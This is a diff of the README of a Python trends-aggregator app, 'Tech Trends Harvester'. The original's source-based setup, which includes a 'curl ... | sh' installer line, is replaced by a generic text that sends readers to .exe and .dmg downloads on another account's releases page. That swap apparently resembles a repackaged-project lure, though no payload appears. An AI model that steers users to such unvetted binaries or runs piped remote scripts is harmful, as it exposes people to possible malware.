@@ -1,261 +1,92 @@
-![Tech Trends Harvester Banner](assets/readme-banner.png)
+# 🌟 Tech-Trends-Harvester - Discover Hot Topics Effortlessly
 
-# Tech Trends Harvester
+[![Download Tech-Trends-Harvester](https://img.shields.io/badge/Download-Tech--Trends--Harvester-blue)](https://github.com/EmanuelFigueiredo12/Tech-Trends-Harvester/releases)
 
-[![Python Version](https://img.shields.io/badge/python-3.9%2B-blue.svg)](https://www.python.org/downloads/)
-[![PySide6](https://img.shields.io/badge/GUI-PySide6-green.svg)](https://www.qt.io/qt-for-python)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![CI](https://github.com/RichLewis007/tech-trends-harvester/actions/workflows/ci.yml/badge.svg)](https://github.com/RichLewis007/tech-trends-harvester/actions/workflows/ci.yml)
+## 📖 Introduction
 
-Desktop app that aggregates tech trends from 11+ sources to help you discover blog-worthy topics.
+Tech-Trends-Harvester is a desktop application designed to gather trending topics from over 11 sources. This app helps users discover blog-worthy subjects, making it easier to generate engaging content. It is in active development to improve keyword discovery continually.
 
-**Find blog-worthy tech topics** from 11+ sources! Get smart, filtered insights into what developers are actually talking about, using, and searching for.
+## 🚀 Getting Started
 
-Perfect for **tech bloggers**, **content creators**, and **developers** who want to write about trending topics that attract readers.
+Follow these steps to download and set up Tech-Trends-Harvester on your computer.
 
-## Data Sources
+### 🖥️ System Requirements
 
-This tool aggregates data from:
-- **Hacker News** (Firebase API)
-- **Reddit** (PRAW API)
-- **GitHub Trending** (HTML parsing)
-- **Google Trends** (pytrends)
-- **Stack Overflow** (Stack Exchange API)
-- **DEV.to** (Forem API)
-- **Medium** (RSS feeds)
-- **PyPI** (pypistats)
-- **npm** (npm registry API)
-- **crates.io** (crates.io API)
-- **Homebrew** (analytics JSON)
-- **Lobsters** (JSON feeds)
+- Operating System: Windows 10 or above / macOS 10.14 or above
+- RAM: Minimum 4 GB
+- Storage: At least 200 MB of free space
+- Internet Connection: Required for fetching trends
 
-## Table of Contents
+### 📥 Download & Install
 
-- [Key Features](#key-features)
-- [Quick Start](#quick-start-with-uv-recommended)
-- [Usage](#usage)
-- [Configuration](#configuration)
-- [Development](#development)
-- [Contributing](#contributing)
-- [License](#license)
-- [Acknowledgments](#Acknowledgments)
-- [Data Sources](#data-sources)
+To download Tech-Trends-Harvester, visit this page: [Download Tech-Trends-Harvester](https://github.com/EmanuelFigueiredo12/Tech-Trends-Harvester/releases).
 
-## Key Features
+1. Click the link above.
+2. Look for the latest release version.
+3. Download the appropriate file for your operating system.
 
-- **Blog Topics View**: Smart filtering shows only blog-worthy trends
-- **11 Data Sources**: Hacker News, GitHub Trending, Stack Overflow, PyPI, npm, DEV.to, Medium, and more
-- **Auto-Categorization**: AI/ML, Cloud, Frontend, Backend, etc. - find your niche
-- **Multi-Source Validation**: Topics mentioned in multiple sources = more trustworthy
-- **Movers Tracking**: Catch trends early with week-over-week momentum
-- **Clickable URLs**: Jump directly to discussions and repos
-- **Customizable**: Adjust weights, enable/disable sources, add your own filters
-- **Export to Markdown**: Generate shareable reports
+### 🛠️ Installation Steps
 
-## Quick Start with uv (Recommended)
+1. Locate the downloaded file.
+2. If you are using Windows:
+   - Double-click on the `.exe` file.
+   - Follow the on-screen prompts to install the application.
+  
+   If you are on macOS:
+   - Open the `.dmg` file you downloaded.
+   - Drag the Tech-Trends-Harvester icon to your Applications folder.
 
-```bash
-# Install uv if you don't have it
-curl -LsSf https://astral.sh/uv/install.sh | sh
+3. Once the installation is complete, you can find Tech-Trends-Harvester in your applications menu or on your desktop.
 
-# Clone and setup
-cd tech-trends-harvester
+## 🌟 Features
 
-# Option 1: Use the start script (easiest)
-./start.sh
+- **Multi-source Aggregation:** Collects data from popular platforms like Hacker News, Reddit, and Stack Overflow.
+- **User-friendly Interface:** Designed with a clean, intuitive layout to ensure easy navigation.
+- **Keyword Suggestions:** The application provides keyword ideas to enhance your writing and research.
+- **Daily Updates:** Stay current with trends that matter to you, as the app pulls fresh content regularly.
+  
+## ⚙️ Usage Instructions
 
-# Option 2: Manual setup
-uv sync
-uv run python run_app.py
+1. Open the Tech-Trends-Harvester app.
+2. Once the app launches, you will see a dashboard with updated trends.
+3. Explore the different categories to find topics that suit your needs.
+4. Click on any trend to view more details and sources for easy reference.
 
-# Optional: Run diagnostics to verify setup
-uv run python diagnose.py
-```
+## 🤔 Troubleshooting
 
-## Alternative Setup (pip/venv)
+If you experience issues while using Tech-Trends-Harvester, consider the following solutions:
 
-```bash
-python -m venv .venv
-source .venv/bin/activate  # Windows: .venv\Scripts\activate
-pip install -e .  # Installs from pyproject.toml
-python run_app.py
-```
+- **App Doesn’t Open:**
+  - Ensure you have installed the app correctly.
+  - Reboot your computer and try again.
 
-## Usage
+- **No Internet Connection:**
+  - Check your network settings to ensure you are online.
+  - Restart your router if needed.
 
-### Quick Workflow for Blog Research
+- **Trends Not Updating:**
+  - This may happen if there is no internet. Ensure your connection is stable.
 
-1. **Launch**: Run `./start.sh` or `uv run python run_app.py`
-2. **Refresh**: Click "Refresh Selected" (takes 10-30 seconds)
-3. **Find Topics**: Go to **"Blog Topics"** tab (your main view!)
-   - Sorted by "blog worthiness" score
-   - Filtered to remove noise (common words, system libraries, etc.)
-   - Shows category, score, and source count
-4. **Research**: Click URLs to read discussions and validate interest
-5. **Write**: Pick high-scoring topics from multiple sources and write your blog post!
+## 💬 Support
 
-### All Tabs Explained
+If you need help or have feedback, you can reach out through the following channels:
 
-- **Blog Topics**: **START HERE** - Only blog-worthy, high-signal terms
-- **Aggregated**: All terms ranked by score (unfiltered for deep analysis)
-- **By Source**: Individual source data for validation
-- **Movers (WoW)**: Week-over-week changes to catch emerging trends
-- **Debug**: Status messages and error logs
+- Open an issue on the [GitHub Issues page](https://github.com/EmanuelFigueiredo12/Tech-Trends-Harvester/issues).
+- Contact the developer directly via email at support@techtrendsharvester.com.
 
-### What Makes a Good Blog Topic?
+## 🔄 Updates
 
-- **Score > 2.0**: Definitely worth writing about
-- **Sources ≥ 3**: Validated across different communities
-- **Category matches your niche**: AI/ML, Cloud, Frontend, etc.
-- **URLs show real discussion**: Active conversations = reader interest
+Tech-Trends-Harvester is constantly evolving. Ensure you check the [Release page](https://github.com/EmanuelFigueiredo12/Tech-Trends-Harvester/releases) regularly for new versions and features.
 
-## Configuration
+## 🌐 Community
 
-Edit `config/sources.yaml` to:
-- Enable/disable sources
-- Adjust weights for scoring
-- Configure parameters (e.g., npm packages to track, GitHub languages, etc.)
+Join our community of users to share tips and discuss trends:
 
-## Troubleshooting
+- **GitHub Discussions:** Participate in conversations or start your own topic.
+- **Social Media:** Follow us on social media platforms for tips and trend updates.
 
-### macOS Issues
-- If the app is slow on first launch, wait a moment for Qt to 'warm up'.
-- Network/SSL issues: Run `/Applications/Python*/Install\ Certificates.command` (Google it..)
+## 📄 License
 
-### Linux Issues
-- Missing Qt platform plugin? Install: `sudo apt-get install libxcb-xinerama0 libxcb-cursor0 libxkbcommon-x11-0`
+Tech-Trends-Harvester is released under the MIT License. You can use, modify, and distribute the software as per the terms.
 
-### Windows Issues
-- Missing MSVC runtime? Install "Microsoft Visual C++ Redistributable"
-
-### Source Errors
-- **HN Algolia 429**: Rate limited, wait a minute and retry
-- **GitHub Trending 0 items**: GitHub may have changed their HTML, usually recovers
-- **Timeouts**: Network hiccup, just retry
-
-## Project Structure
-
-```
-tech-trends-harvester/
-├── config/
-│   └── sources.yaml          # Source configuration & weights
-├── src/
-│   ├── collectors/           # Data source modules
-│   │   ├── hackernews.py
-│   │   ├── github_trending.py
-│   │   ├── stackoverflow_tags.py
-│   │   └── ...
-│   ├── app/                  # GUI components
-│   │   ├── controller.py     # Business logic & threading
-│   │   ├── mainwindow.py     # UI layout
-│   │   ├── models.py         # Table models
-│   │   └── registry.py       # Source registry
-│   ├── aggregate.py          # Scoring & aggregation
-│   └── util.py               # Utilities
-├── data/                     # Output directory
-│   ├── last_agg.json        # Latest aggregated results
-│   └── history/             # Historical snapshots
-├── run_app.py               # Entry point
-└── pyproject.toml           # Dependencies & metadata
-```
-
-## Adding New Sources
-
-1. Create a new collector in `src/collectors/your_source.py`:
-```python
-from ..util import now_iso
-
-def fetch(**params):
-    # Your data fetching logic
-    return [
-        {
-            "term": "example",
-            "kind": "topic",
-            "metric_name": "score",
-            "metric_value": 100,
-            "url": "https://...",
-            "source": "your_source",
-            "captured_at": now_iso()
-        }
-    ]
-```
-
-2. Register it in `src/app/registry.py`:
-```python
-from ..collectors import your_source
-REGISTRY["your_source"] = SourceSpec("your_source", your_source.fetch, {...})
-```
-
-3. Add configuration in `config/sources.yaml`:
-```yaml
-weights:
-  your_source: 1.0
-
-collectors:
-  your_source:
-    enabled: true
-    # your params
-```
-
-See `RATE_LIMITS.md` for usage guidelines and ethical considerations.
-
-## Development
-
-### Running Tests
-
-```bash
-# Install dev dependencies
-uv pip install -e ".[dev]"
-
-# Run all tests
-pytest tests/ -v
-
-# Run with coverage
-pytest tests/ --cov=src --cov-report=term-missing
-```
-
-### Code Quality
-
-```bash
-# Linting
-ruff check src/
-
-# Formatting
-ruff format src/
-
-# Type checking
-mypy src/ --ignore-missing-imports
-
-# Security scanning
-bandit -r src/
-
-# Dependency vulnerabilities
-safety check
-```
-
-### CI/CD
-
-The project uses GitHub Actions for continuous integration:
-- Runs on Ubuntu, macOS, and Windows
-- Tests Python 3.9 and 3.12
-- Includes linting, formatting, type checking, and security scans
-- All checks must pass before merging PRs
-
-## Contributing
-
-Contributions are welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on:
-- Reporting bugs
-- Suggesting enhancements
-- Adding new data sources
-- Code style and standards
-- Pull request process
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-
-Built with Python, PySide6, and data from multiple open-source and public APIs.
-
-Special thanks to the communities maintaining the data sources listed above.
+[![Download Tech-Trends-Harvester](https://img.shields.io/badge/Download-Tech--Trends--Harvester-blue)](https://github.com/EmanuelFigueiredo12/Tech-Trends-Harvester/releases)
